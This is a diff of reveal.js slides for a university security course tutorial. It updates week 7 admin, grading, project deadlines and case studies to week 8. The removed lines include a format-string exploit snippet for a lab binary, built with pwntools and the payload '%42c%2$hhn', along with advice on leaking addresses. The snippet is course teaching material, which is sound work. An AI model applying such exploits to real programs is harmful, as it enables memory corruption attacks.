@@ -18,12 +18,8 @@
 			<div class="slides">
 				<section>
 					<section>
-						Welcome to week 7!<br>
+						Welcome to week 8!<br>
 						We'll start at 10:05am
-					</section>
-					<section>
-						I'm trialling slides this week<br>
-						Please let me know if you like this format better 🙂
 					</section>
 				</section>
 				<section>
@@ -31,31 +27,18 @@
 						Admin
 					</section>
 					<section>
-						Module 1-3 marks have been released<br>
-						<img src="marks.png" alt="Marks"><br>
-						Has anyone not received an email?
-					</section>
-					<section>
-						Technical writeups were good<br>
+						Technical Writeups<br><br>
 						Please give me an indication of not being able to progress (i.e. what you tried that didn't work, and asking for help)
 					</section>
 					<section>
-						Module 4/5 case studies:<br>
-						<ul>
-							<li>Johnny Cab</li>
-							<li>Snoop</li>
-						</ul><br>
-						Houdini optional
-					</section>
-					<section>
 						Simplified Grading Scheme (SGS)<br>
-						Opt-in form released sometime this week<br>
-						Guaranteed mark (70?) iff you pass all parts of the course<br>
-					</section>
-					<section>
-						Final exam hint<br>
-						<img src="strangelove.jpg" alt="Strangelove" height="400"><br>
-						Week 10 security theatre
+						<ul>
+							<li>Three-course components (Logbooks, Something Awesome Project, Final Exam) - 70 for the Course</li>
+							<li>Two components - 50</li>
+							<li>One components - 30</li>
+							<li>Zero components - 0</li>
+						</ul>
+						<br><br><a href="https://forms.office.com/r/08cLxzJmXy">Opt-in form</a>
 					</section>
 					<section>
 						Questions?
@@ -66,38 +49,13 @@
 						Something Awesome
 					</section>
 					<section>
-						Due Week 8 Friday at 6pm 😦<br>
-						Take the three day simple extension!
+						Due 6pm Monday next week (including the three day simple extension)
 					</section>
 					<section>
-						Checking in with you today
+						Any problems?
 					</section>
 					<section>
-						Requirements:<br>
-						<ul>
-							<li>Presentation (in W9/W10)</li>
-							<li>Report (any format)</li>
-						</ul>
-					</section>
-					<section>
-						Presentation:<br>
-						<ul>
-							<li>Basically show and tell</li>
-							<li>Next week we will establish order</li>
-							<li>I will be giving full marks if you try (unless I am provided with a marking rubric)</li>
-						</ul>
-					</section>
-					<section>
-						Report:<br>
-						<ul>
-							<li>Any format (text, video etc.)</li>
-							<li>Please don't zip bomb me 🥺</li>
-							<li>Should be summary and reflection on project</li>
-							<li>Including a breakdown of how you spent your time will make giving you marks much easier</li>
-						</ul>
-					</section>
-					<section>
-						<iframe data-src="report.pdf" data-preload height="600" width="1200"></iframe>
+						<a href="https://webcms3.cse.unsw.edu.au/COMP6441/24T3/resources/106807">Official requirements</a>
 					</section>
 					<section>
 						Questions?
@@ -105,77 +63,19 @@
 				</section>
 				<section>
 					<section>
-						Case Study 1
+						Case Study<br><br>
+						Ghost<br>
+						<a href="https://www.openlearning.com/secedu/courses/security-engineering-lecture-slides-2024/slides/ghost-case-study/?cl=1">OpenLearning</a>
 					</section>
 					<section>
-						Nuclear missile warning system<br>
-						<img src="hawaii.jpg" alt="Hawaii" height="300">
-					</section>
-					<section>
-						You have been put in charge of the Australian Emergency Management Agency.<br><br>
-						Consider whether there are better alternatives present to replace an SMS alert in Sydney for future Missile threats.<br><br>
-						What should we do, how would you design an early warning system and what are your recommendations?
+						Communication via a person in the middle<br>
+						Daniel (invisible)->Nick (crazy)->Major<br>
+						Major->Nick (crazy)->Daniel (invisible)<br>
 					</section>
 				</section>
 				<section>
 					<section>
-						Case Study 2<br>
-						Drownings
-					</section>
-					<section>
-						Every year there are a lot of reported adult drownings - particularly the problem of adults going in to rescue children.<br>
-						As a result, the adult ends up putting their own lives at risk, with the child being saved as the end result.
-					</section>
-					<section>
-						You are the minister tasked with solving this issue - come up with a plan to stop this from happening.
-					</section>
-				</section>
-				<section>
-					<section>
-						Extended Content: Format Strings!
-					</section>
-					<section>
-						Login1 and Login2 look broken
-					</section>
-					<section>
-						Favourite Number<br>
-						<ul>
-							<li>How to win?</li>
-							<li>Binary Ninja<ul>
-								<li>Win function</li>
-								<li>Called if favourite number <= 99</li>
-								<li>But favourite number is random!</li>
-							</ul></li>
-							<li>What if we could overwrite favourite number?</li>
-						</ul>
-					</section>
-					<section>
-						<pre><code data-trim data-noescape>
-							# you can use pwntools to find the address of your target
-							targetAddress = ELF(binary).symbols['target']
-
-							# overwrite target with 42: %42c -> 41 spaces and some char
-							# %2$hhn -> 1 byte (half half) at the 2nd position
-							payload = b"%42c%2$hhn"
-
-							# 8 byte align your argument on the stack
-							payload = payload.ljust(64)
-
-							# insert targetAddress onto the stack after your argument
-							# to overwrite your target
-							payload += p64(targetAddress)
-						</code></pre>
-					</section>
-					<section>
-						<pre><code data-trim data-noescape>
-							ELF(binary).symbols['target']
-						</code></pre>
-						On remote, this will not work<br>
-						Your target may be at the same address<br>
-						You may have to leak it
-					</section>
-					<section>
-						Questions?
+						Extended Content?
 					</section>
 				</section>
 				<section>
